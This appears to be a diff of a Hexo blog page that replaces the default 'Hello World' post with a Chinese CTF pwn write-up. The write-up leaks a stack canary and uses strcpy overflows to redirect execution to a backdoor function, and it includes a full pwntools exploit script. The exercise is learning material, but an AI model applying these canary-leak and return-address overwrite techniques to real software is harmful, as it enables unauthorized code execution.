@@ -19,21 +19,23 @@
   <meta name="author" content="xyyr">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+    <meta name="description" content="GuestBooK–pwn 先利用read与puts，填充掉canary的最后一位，把canary打印出来，用这种不一样的字符方便接收和检验 1payload &#x3D; b&quot;A&quot;*(0x20-0x8-1)+b&quot;B&quot;+b&#x27;C&#x27;   然后需要利用strcpy输入两次，第一次把最后一位不对的canary以及后门函数地址输入进去，第二次把canary最">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Hello World">
-<meta property="og:url" content="https://xyyr-c.github.io/2024/10/22/hello-world/index.html">
+<meta property="og:title" content="xyyr">
+<meta property="og:url" content="https://xyyr-c.github.io/2024/10/23/GuestBooK--pwn/index.html">
 <meta property="og:site_name" content="xyyr">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="GuestBooK–pwn 先利用read与puts，填充掉canary的最后一位，把canary打印出来，用这种不一样的字符方便接收和检验 1payload &#x3D; b&quot;A&quot;*(0x20-0x8-1)+b&quot;B&quot;+b&#x27;C&#x27;   然后需要利用strcpy输入两次，第一次把最后一位不对的canary以及后门函数地址输入进去，第二次把canary最">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2024-10-22T02:53:43.761Z">
-<meta property="article:modified_time" content="2024-10-22T02:53:43.761Z">
+<meta property="og:image" content="d:\%E5%88%B7%E9%A2%98wp\picture\image-20231102185214523.png">
+<meta property="article:published_time" content="2024-10-23T08:59:53.713Z">
+<meta property="article:modified_time" content="2023-11-02T11:01:55.309Z">
 <meta property="article:author" content="xyyr">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="d:\%E5%88%B7%E9%A2%98wp\picture\image-20231102185214523.png">
   
   
   
-  <title>Hello World - xyyr</title>
+  <title>xyyr</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -216,7 +218,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Hello World"></span>
+            <span id="subtitle" data-typed-text=""></span>
           
         </div>
 
@@ -227,8 +229,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-10-22 10:53" pubdate>
-          2024年10月22日 上午
+        <time datetime="2024-10-23 16:59" pubdate>
+          2024年10月23日 下午
         </time>
       </span>
     
@@ -239,7 +241,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          18 字
+          359 字
         
       </span>
     
@@ -250,7 +252,7 @@
         
         
         
-          1 分钟
+          3 分钟
         
       </span>
     
@@ -287,24 +289,39 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Hello World</h1>
+            <h1 id="seo-header"></h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2023年11月2日 晚上
+                  
+                
+              </p>
             
             
               <div class="markdown-body">
                 
-                <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure>
+                <h3 id="GuestBooK–pwn"><a href="#GuestBooK–pwn" class="headerlink" title="GuestBooK–pwn"></a>GuestBooK–pwn</h3><ul>
+<li><p>先利用read与puts，填充掉canary的最后一位，把canary打印出来，用这种不一样的字符方便接收和检验</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&quot;B&quot;</span>+<span class="hljs-string">b&#x27;C&#x27;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="D:\刷题wp\picture\image-20231102185214523.png" srcset="/img/loading.gif" lazyload alt="image-20231102185214523"></p>
+<p>然后需要利用strcpy输入两次，第一次把最后一位不对的canary以及后门函数地址输入进去，第二次把canary最后一位改为‘00’</p>
+<blockquote>
+<p>当时没做出来，忘记了这种基础的泄露canary的方式了   <del>》我真该死《</del></p>
+<p>有一些要注意的地方：</p>
+<ul>
+<li>填充不一样的字母来方便接收的停顿</li>
+<li>strcpy遇到00会截断，所以不能有00，第一次注意注入的时候不要被截断掉</li>
+<li>第二次利用strcpy会在最后加\x00的特性，来恢复canary的正确值</li>
+<li>第二次不是在栈顶输入的，要加0x20</li>
+<li>循环中的这个输入没有限制长度（当时做的时候<del>脑抽</del>没想到）</li>
+</ul>
+</blockquote>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./GuestBook&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;&#x27;,)</span><br>sl = <span class="hljs-keyword">lambda</span> s :p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s :p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> s :p.recv(s)<br>ru = <span class="hljs-keyword">lambda</span> s :p.recvuntil(s)<br>rl = <span class="hljs-keyword">lambda</span>   :p.recvline()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause(<span class="hljs-number">1</span>)<br>backdoor_addr = <span class="hljs-number">0x04012C0</span><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0x20</span>-<span class="hljs-number">0x8</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&quot;B&quot;</span>+<span class="hljs-string">b&#x27;C&#x27;</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>sd(payload)<br>ru(<span class="hljs-string">&#x27;B&#x27;</span>)<br><br>canary = u64(rc(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br>sl(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><br>payload = <span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x8</span>)+p64(canary)*<span class="hljs-number">2</span>+p64(backdoor_addr)<br>sl(payload)<br><br>payload = <span class="hljs-string">b&quot;A&quot;</span>*(<span class="hljs-number">0xa0</span>-<span class="hljs-number">0x20</span>-<span class="hljs-number">8</span>)<br>debug()<br>sl(payload)<br><br>p.interactive()                <br></code></pre></td></tr></table></figure>
 
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
 
                 
               </div>
@@ -322,8 +339,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Hello World</div>
-      <div>https://xyyr-c.github.io/2024/10/22/hello-world/</div>
+      <div></div>
+      <div>https://xyyr-c.github.io/2024/10/23/GuestBooK--pwn/</div>
     </div>
     <div class="license-meta">
       
@@ -335,7 +352,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年10月22日</div>
+          <div>2024年10月23日</div>
         </div>
       
       
@@ -367,15 +384,21 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/10/23/%E5%88%9D%E5%AD%A6%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/" title="初学安卓逆向（课是关卡+1）">
+                      <a href="/2024/10/23/NewStatCTF--week3-pwn%20srop/" title="">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">初学安卓逆向（课是关卡+1）</span>
+                        <span class="hidden-mobile"></span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
                   </article>
                   <article class="post-next col-6">
                     
+                    
+                      <a href="/2024/10/23/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9B-badboy/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
                     
                   </article>
                 </div>
